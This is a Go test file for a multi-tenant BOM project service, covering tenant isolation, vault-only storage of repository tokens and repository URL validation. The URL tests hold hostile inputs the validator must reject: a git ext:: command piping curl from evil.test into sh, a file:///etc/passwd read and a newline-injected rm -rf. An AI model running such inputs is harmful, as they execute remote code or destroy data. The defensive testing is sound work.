package service_test

import (
	"context"
	"errors"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/axebom/axebom/libs/go-shared/model"
	"github.com/axebom/axebom/libs/go-shared/platform/config"
	"github.com/axebom/axebom/libs/go-shared/platform/db"
	"github.com/axebom/axebom/libs/go-shared/platform/errs"
	"github.com/axebom/axebom/libs/go-shared/vault"
	"github.com/axebom/axebom/services/project/internal/service"
	"github.com/axebom/axebom/services/project/internal/store"
)

// Phase 4 acceptance tests.
//
// Against real Postgres, because the properties under test are properties of
// the database: RLS isolation, the validity-window CHECK constraint, and the
// classification join. A mocked store would pass while the product leaks.
//
// They SKIP without a database (`task dev && task db:reset`); CI always has one.

// Seeded tenants from migrations/seed/0001_dev_tenants.sql. Two of them, so a
// cross-tenant leak shows up as an extra row rather than as nothing.
const (
	tenantA = "01900000-0000-7000-8000-00000000000a"
	tenantB = "01900000-0000-7000-8000-00000000000b"
	userA   = "01900000-0000-7000-8000-0000000000a1"
)

type fixture struct {
	svc   *service.Service
	store *store.Store
	vault *vault.Memory
	pool  *db.Pool
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	if os.Getenv("SKIP_DB_TESTS") != "" {
		t.Skip("SKIP_DB_TESTS is set")
	}
	cfg, err := config.LoadService("project")
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	pool, err := db.Open(t.Context(), cfg.Postgres)
	if err != nil {
		t.Skipf("database unavailable (%v) — run `task dev && task db:reset`", err)
	}
	t.Cleanup(pool.Close)

	st := store.New(pool)
	// Blob is nil: no test here uploads. A nil pointer would panic loudly if
	// one did, which beats silently exercising a different code path.
	mem := vault.NewMemory()
	return &fixture{
		svc:   service.New(service.Config{Store: st, Vault: mem}),
		store: st, vault: mem, pool: pool,
	}
}

// uniqueName avoids colliding with a previous run on UNIQUE (tenant_id, name).
func uniqueName(t *testing.T) string {
	t.Helper()
	return strings.ToLower(strings.ReplaceAll(t.Name(), "/", "-")) +
		"-" + time.Now().Format("150405.000000000")
}

// createProject makes a project the product would actually accept.
//
// ⚠ THE DEFAULT SOURCE WAS "manual", AND EVERY TEST INHERITED AN UNSCANNABLE
// PROJECT. A manual project has no repository, no upload and no URL, so
// handler.go's Source() switch falls through to the repository branch and
// answers "the project has no repository connection to fetch from" — for an
// SBOM project that is a dead end, not a registration. Nothing refused the
// combination until the BOM-module seam did, so ~28 tests were quietly built on
// a shape a customer could create and never scan. `upload` is the honest
// default: it is a real SBOM path (project.uploads has an `sbom` kind) and it
// is what the Source() switch handles first.
func createProject(t *testing.T, f *fixture, tenantID string, classifications ...string) store.Project {
	t.Helper()
	return createProjectFromSource(t, f, tenantID, "upload", classifications...)
}

// createProjectFromSource is for tests whose subject is the source itself.
func createProjectFromSource(t *testing.T, f *fixture, tenantID, sourceType string,
	classifications ...string,
) store.Project {
	t.Helper()
	if len(classifications) == 0 {
		classifications = []string{"SBOM"}
	}
	p, err := f.svc.Create(t.Context(), tenantID, userA, service.CreateInput{
		Name:            uniqueName(t),
		SourceType:      sourceType,
		Classifications: classifications,
	})
	if err != nil {
		t.Fatalf("create project: %v", err)
	}
	cleanupProject(t, f, tenantID, p.ID)
	return p
}

// cleanupProject HARD-deletes a test project when the test finishes.
//
// Not svc.Delete, which soft-deletes on purpose so compliance history survives.
// Tests need the row gone: leaving hundreds behind slows every later query and,
// worse, breaks any test elsewhere that reasons about row counts. Finding that
// out the hard way is what prompted this — see the note in
// platform/db/rls_test.go.
//
// Registered as a Cleanup so it runs even when the test fails.
func cleanupProject(t *testing.T, f *fixture, tenantID, projectID string) {
	t.Helper()
	t.Cleanup(func() {
		// A fresh context: t.Context() is already cancelled by cleanup time.
		err := f.pool.WithTenant(context.Background(), tenantID,
			func(ctx context.Context, tx db.Tx) error {
				// Children cascade from the project row.
				_, err := tx.Exec(ctx, `DELETE FROM project.projects WHERE id = $1`, projectID)
				return err
			})
		if err != nil {
			t.Logf("cleanup: could not delete project %s: %v", projectID, err)
		}
	})
}

// ---------------------------------------------------------------------------
// Registration
// ---------------------------------------------------------------------------

// TestCreateManualProject registers a project on the manual path.
//
// ⚠ CLASSIFIED HBOM, NOT SBOM, AND THAT IS THE POINT OF THE TEST NOW. This used
// to create a manual SBOM project — a combination the product accepted and
// could never scan. Manual registration is a FIRST-CLASS path for hardware
// (CLAUDE.md's honest labels: a device, its parts tree and a CSV import produce
// a real document with no repository) and for QBOM's Table 8 device form. It is
// not a path for SBOM, where no form produces a component inventory.
func TestCreateManualProject(t *testing.T) {
	f := newFixture(t)
	p := createProjectFromSource(t, f, tenantA, "manual", "HBOM")

	if p.ID == "" {
		t.Fatal("no id returned")
	}
	if p.SDLCStage != "source" {
		t.Errorf("sdlc_stage = %q, want the 'source' default", p.SDLCStage)
	}
	if len(p.Classifications) != 1 || p.Classifications[0] != model.BOMTypeHBOM {
		t.Errorf("classifications = %v", p.Classifications)
	}
}

// A manual SBOM project is refused: there is no form that produces a component
// inventory, so it would register cleanly and never scan.
func TestAManualSBOMProjectIsRefused(t *testing.T) {
	f := newFixture(t)
	_, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name:            uniqueName(t),
		SourceType:      "manual",
		Classifications: []string{"SBOM"},
	})
	if err == nil {
		t.Fatal("a manual SBOM project was accepted; it can never be scanned")
	}
	if !strings.Contains(err.Error(), "manual") {
		t.Errorf("the refusal does not name the source: %v", err)
	}
}

// A project may carry any subset of the five BOM types, and the set must
// round-trip — not collapse to one, not reorder into nonsense.
func TestClassificationIsMultiSelectAndRoundTrips(t *testing.T) {
	f := newFixture(t)
	want := []string{"SBOM", "CBOM", "AIBOM"}

	created := createProject(t, f, tenantA, want...)
	if len(created.Classifications) != len(want) {
		t.Fatalf("created with %v, want %d types", created.Classifications, len(want))
	}

	got, err := f.svc.Get(t.Context(), tenantA, created.ID)
	if err != nil {
		t.Fatalf("get: %v", err)
	}

	set := map[model.BOMType]bool{}
	for _, c := range got.Classifications {
		set[c] = true
	}
	for _, w := range want {
		if !set[model.BOMType(w)] {
			t.Errorf("classification %s did not round-trip: got %v", w, got.Classifications)
		}
	}
}

// A project classified into nothing would be registered, scannable, and
// produce no BOM at all — a silent no-op discovered only when a report is empty.
func TestProjectWithNoClassificationIsRejected(t *testing.T) {
	f := newFixture(t)
	_, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name: uniqueName(t), SourceType: "manual", Classifications: nil,
	})
	if err == nil {
		t.Fatal("a project with no BOM type was accepted")
	}
	if !errs.Is(err, errs.ValidationFieldRequired) {
		t.Errorf("code = %v, want VALIDATION_FIELD_REQUIRED", err)
	}
}

func TestUnknownBOMTypeIsRejected(t *testing.T) {
	f := newFixture(t)
	_, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name: uniqueName(t), SourceType: "manual",
		Classifications: []string{"SBOM", "XBOM"},
	})
	if err == nil {
		t.Fatal("an unknown BOM type was accepted")
	}
}

// The SDLC stage set comes from the compliance profile (CERT-In §3.2). This
// asserts the binding holds, so a profile revision cannot silently disagree
// with what the service accepts.
func TestSDLCStageIsValidatedAgainstTheProfile(t *testing.T) {
	f := newFixture(t)

	for _, stage := range model.SDLCClassifications {
		p, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
			Name: uniqueName(t) + "-" + stage, SourceType: "upload",
			SDLCStage: stage, Classifications: []string{"SBOM"},
		})
		if err != nil {
			t.Errorf("profile stage %q was rejected: %v", stage, err)
			continue
		}
		cleanupProject(t, f, tenantA, p.ID)
	}

	if _, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name: uniqueName(t), SourceType: "upload",
		SDLCStage: "production", Classifications: []string{"SBOM"},
	}); err == nil {
		t.Error("a stage outside the profile was accepted")
	}
}

// ---------------------------------------------------------------------------
// Validity window
// ---------------------------------------------------------------------------

// The service rejects it for a clear message, but the DATABASE is what makes it
// true: a handler check is bypassed by any other write path. This test asserts
// BOTH, and the store-level half is the one that matters.
func TestValidityWindowRejectsEndBeforeStart(t *testing.T) {
	f := newFixture(t)
	start := time.Date(2026, 6, 1, 0, 0, 0, 0, time.UTC)
	end := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)

	t.Run("service", func(t *testing.T) {
		_, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
			Name: uniqueName(t), SourceType: "manual",
			Classifications: []string{"SBOM"},
			ValidityStart:   &start, ValidityEnd: &end,
		})
		if err == nil {
			t.Fatal("the service accepted a backwards validity window")
		}
	})

	t.Run("database constraint", func(t *testing.T) {
		// Straight to the store, bypassing the service check entirely.
		_, err := f.store.CreateProject(t.Context(), store.Project{
			TenantID: tenantA, Name: uniqueName(t), SourceType: "manual",
			SDLCStage: "source", CreatedBy: userA,
			ValidityStart: &start, ValidityEnd: &end,
		})
		if err == nil {
			t.Fatal("the database accepted a backwards validity window; " +
				"validity_window_ordered is not enforcing")
		}
		if !strings.Contains(err.Error(), "validity_window_ordered") {
			t.Errorf("rejected for the wrong reason: %v", err)
		}
	})
}

func TestValidityWindowAcceptsEqualDates(t *testing.T) {
	f := newFixture(t)
	day := time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)

	p, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name: uniqueName(t), SourceType: "upload", Classifications: []string{"SBOM"},
		ValidityStart: &day, ValidityEnd: &day,
	})
	if err != nil {
		t.Fatalf("a single-day validity window was rejected: %v", err)
	}
	cleanupProject(t, f, tenantA, p.ID)
}

// ---------------------------------------------------------------------------
// Tenant isolation
// ---------------------------------------------------------------------------

// ⚠ THE CROSS-TENANT TEST.
//
// 404, never 403. A 403 confirms the id exists, which lets an attacker
// enumerating UUIDs learn which are real (CLAUDE.md invariant 6).
func TestCrossTenantAccessIsNotFound(t *testing.T) {
	f := newFixture(t)
	p := createProject(t, f, tenantA)

	t.Run("read", func(t *testing.T) {
		_, err := f.svc.Get(t.Context(), tenantB, p.ID)
		if err == nil {
			t.Fatal("tenant B read tenant A's project")
		}
		assertNotFound(t, err)
	})

	t.Run("update", func(t *testing.T) {
		_, err := f.svc.Update(t.Context(), tenantB, p.ID, service.UpdateInput{
			Name: "hijacked", Classifications: []string{"SBOM"},
		})
		if err == nil {
			t.Fatal("tenant B updated tenant A's project")
		}
		assertNotFound(t, err)
	})

	t.Run("delete", func(t *testing.T) {
		err := f.svc.Delete(t.Context(), tenantB, p.ID)
		if err == nil {
			t.Fatal("tenant B deleted tenant A's project")
		}
		assertNotFound(t, err)
	})

	t.Run("connect a repository", func(t *testing.T) {
		_, err := f.svc.Connect(t.Context(), tenantB, p.ID, service.ConnectInput{
			Provider: "github", RepoURL: "https://github.com/acme/app.git",
			RepoExternalID: "12345",
		})
		if err == nil {
			t.Fatal("tenant B connected a repository to tenant A's project")
		}
		assertNotFound(t, err)
	})

	t.Run("read practices", func(t *testing.T) {
		// Practices returns a zero value for an absent row, so the guard has
		// to be the PROJECT lookup. Setting is what must fail.
		_, err := f.svc.SetPractices(t.Context(), tenantB, p.ID, service.PracticesInput{})
		if err == nil {
			t.Fatal("tenant B wrote practices onto tenant A's project")
		}
		assertNotFound(t, err)
	})
}

func assertNotFound(t *testing.T, err error) {
	t.Helper()
	if !errs.Is(err, errs.NotFoundProject) {
		t.Errorf("code = %v, want NOT_FOUND_PROJECT (a 403 would confirm the id exists)", err)
	}
	var e *errs.Error
	if errors.As(err, &e) && e.HTTPStatus() != 404 {
		t.Errorf("status = %d, want 404", e.HTTPStatus())
	}
}

// A tenant's listing must contain only its own projects.
func TestListIsScopedToTheTenant(t *testing.T) {
	f := newFixture(t)
	mine := createProject(t, f, tenantA)
	theirs := createProject(t, f, tenantB)

	list, err := f.svc.List(t.Context(), tenantA, 200, "")
	if err != nil {
		t.Fatalf("list: %v", err)
	}

	var sawMine, sawTheirs bool
	for _, p := range list {
		switch p.ID {
		case mine.ID:
			sawMine = true
		case theirs.ID:
			sawTheirs = true
		}
		if p.TenantID != tenantA {
			t.Errorf("listing returned a project from tenant %s", p.TenantID)
		}
	}
	if !sawMine {
		t.Error("the tenant's own project is missing from its listing")
	}
	if sawTheirs {
		t.Error("another tenant's project appeared in the listing")
	}
}

// Two tenants may each have a project called the same thing. The uniqueness
// constraint is per tenant, and getting that wrong would let one customer's
// naming block another's.
func TestProjectNamesAreUniquePerTenantNotGlobally(t *testing.T) {
	f := newFixture(t)
	name := uniqueName(t)

	for _, tenant := range []string{tenantA, tenantB} {
		p, err := f.svc.Create(t.Context(), tenant, userA, service.CreateInput{
			Name: name, SourceType: "upload", Classifications: []string{"SBOM"},
		})
		if err != nil {
			t.Fatalf("tenant %s could not use the name: %v", tenant, err)
		}
		cleanupProject(t, f, tenant, p.ID)
	}

	// But a duplicate WITHIN one tenant is refused.
	_, err := f.svc.Create(t.Context(), tenantA, userA, service.CreateInput{
		Name: name, SourceType: "upload", Classifications: []string{"SBOM"},
	})
	if err == nil {
		t.Error("a duplicate project name was accepted within one tenant")
	}
}

// ---------------------------------------------------------------------------
// Repository connections and credential handling
// ---------------------------------------------------------------------------

// ⚠ THE CREDENTIAL TEST.
//
// The token must reach Vault and the database must hold only a path. If a
// token string ever lands in a column, a database backup becomes a credential
// dump.
func TestRepositoryTokenGoesToVaultAndNeverToPostgres(t *testing.T) {
	f := newFixture(t)
	p := createProject(t, f, tenantA)

	// A DISTINCT token per run. A fixed constant would make this test
	// history-dependent: a leftover row from an earlier run would fail a
	// later, correct one — and worse, could mask a real leak by making the
	// failure look like known pollution.
	token := "ghp_secret_" + uniqueName(t) //nolint:gosec // test fixture, not a real credential

	conn, err := f.svc.Connect(t.Context(), tenantA, p.ID, service.ConnectInput{
		Provider: "github", RepoURL: "https://github.com/acme/app.git",
		RepoExternalID: "424242", DefaultBranch: "main", Token: token,
	})
	if err != nil {
		t.Fatalf("connect: %v", err)
	}

	if !f.vault.Contains(token) {
		t.Error("the token did not reach the vault")
	}
	if conn.CredentialRef == "" {
		t.Fatal("no credential reference was stored")
	}
	if strings.Contains(conn.CredentialRef, token) {
		t.Fatal("the credential reference contains the token itself")
	}

	// Now the direct check: scan the ENTIRE repository_connections table for
	// the token string. This is the assertion that would catch a future change
	// adding a convenience column.
	var hits int
	err = f.pool.WithTenant(t.Context(), tenantA, func(ctx context.Context, tx db.Tx) error {
		return tx.QueryRow(ctx, `
			SELECT count(*) FROM project.repository_connections
			 WHERE repo_url LIKE '%' || $1 || '%'
			    OR COALESCE(credential_ref,'') LIKE '%' || $1 || '%'
			    OR COALESCE(repo_external_id,'') LIKE '%' || $1 || '%'
			    OR COALESCE(default_branch,'') LIKE '%' || $1 || '%'`,
			token).Scan(&hits)
	})
	if err != nil {
		t.Fatalf("scan for the token: %v", err)
	}
	if hits != 0 {
		t.Errorf("the token appears in %d database row(s); it must exist only in the vault", hits)
	}
}

// The stored path is a read primitive: the service holds one Vault token with
// access to the whole mount. A ref that does not belong to the asking tenant
// must be refused BEFORE Vault is contacted.
func TestVaultRefusesAnotherTenantsCredentialReference(t *testing.T) {
	f := newFixture(t)

	refA := vault.Ref{TenantID: tenantA, Kind: vault.KindRepoToken, ID: "conn-1"}
	pathA, err := f.vault.Put(t.Context(), refA, map[string]string{"token": "secret-a"})
	if err != nil {
		t.Fatalf("put: %v", err)
	}

	// Tenant B presents tenant A's path.
	refB := vault.Ref{TenantID: tenantB, Kind: vault.KindRepoToken, ID: "conn-1"}
	if _, err := f.vault.Get(t.Context(), refB, pathA); !errors.Is(err, vault.ErrRefNotOwned) {
		t.Errorf("err = %v, want ErrRefNotOwned — a stored path must not be a "+
			"cross-tenant read primitive", err)
	}

	// The owner still reads it.
	got, err := f.vault.Get(t.Context(), refA, pathA)
	if err != nil || got["token"] != "secret-a" {
		t.Errorf("the owning tenant could not read its own secret: %v %v", got, err)
	}
}

// A public repository needs no credential, and connecting without a token must
// not invent one.
func TestConnectWithoutATokenStoresNoCredential(t *testing.T) {
	f := newFixture(t)
	p := createProject(t, f, tenantA)

	conn, err := f.svc.Connect(t.Context(), tenantA, p.ID, service.ConnectInput{
		Provider: "github", RepoURL: "https://github.com/public/repo.git",
		RepoExternalID: "999",
	})
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	if conn.CredentialRef != "" {
		t.Errorf("credential_ref = %q for a public repository", conn.CredentialRef)
	}
}

// repo_external_id is the provider's numeric id, and it is what later phases
// key on. Names change; connections keyed on a name silently detach on rename.
func TestGitHubConnectionRequiresTheNumericExternalID(t *testing.T) {
	f := newFixture(t)
	p := createProject(t, f, tenantA)

	_, err := f.svc.Connect(t.Context(), tenantA, p.ID, service.ConnectInput{
		Provider: "github", RepoURL: "https://github.com/acme/app.git",
	})
	if err == nil {
		t.Fatal("a GitHub connection was created without repo_external_id")
	}
}

// ---------------------------------------------------------------------------
// URL validation — shape only, NOT an SSRF defence
// ---------------------------------------------------------------------------

func TestRepoURLValidation(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
		why     string
	}{
		{"https", "https://github.com/acme/app.git", false, ""},
		{"http", "http://github.com/acme/app.git", true,
			"http sends credentials and content in the clear"},
		{"ssh", "ssh://git@github.com/acme/app.git", true,
			"we hold no ssh key"},
		{"git protocol", "git://github.com/acme/app.git", true,
			"unauthenticated and unencrypted"},
		{"ext transport", "ext::sh -c 'curl evil.test|sh'", true,
			"git's ext:: transport is arbitrary command execution"},
		{"file", "file:///etc/passwd", true,
			"reads the server's own disk"},
		{"embedded credentials", "https://user:pass@github.com/acme/app.git", true,
			"credentials in a URL end up in a database column in plaintext"},
		{"whitespace", "https://github.com/acme/ app.git", true,
			"argument splitting"},
		{"newline", "https://github.com/acme/app.git\nrm -rf /", true,
			"log forging and argument injection"},
		{"empty", "", true, "nothing to connect to"},
		{"no host", "https:///acme/app.git", true, "no host to reach"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := service.ValidateRepoURL(tt.url)
			if tt.wantErr && err == nil {
				t.Errorf("accepted %q — %s", tt.url, tt.why)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("rejected %q: %v", tt.url, err)
			}
		})
	}
}

// A private address passes SHAPE validation on purpose. Blocking it here would
// be security theatre: DNS rebinding defeats any parse-time check, so the real
// defence is at CONNECTION time in the Phase 5 fetcher. This test pins that
// division of responsibility so nobody later "fixes" it in the wrong layer.
func TestPrivateAddressesAreNotBlockedAtParseTime(t *testing.T) {
	for _, u := range []string{
		"https://169.254.169.254/latest/meta-data/",
		"https://localhost/repo.git",
		"https://10.0.0.1/repo.git",
	} {
		if _, err := service.ValidateRepoURL(u); err != nil {
			t.Errorf("%q was rejected at parse time.\n"+
				"    If this is now intentional, the Phase 5 connection-time check "+
				"must still exist — a parse-time check alone is defeated by DNS "+
				"rebinding and gives false confidence.", u)
		}
	}
}
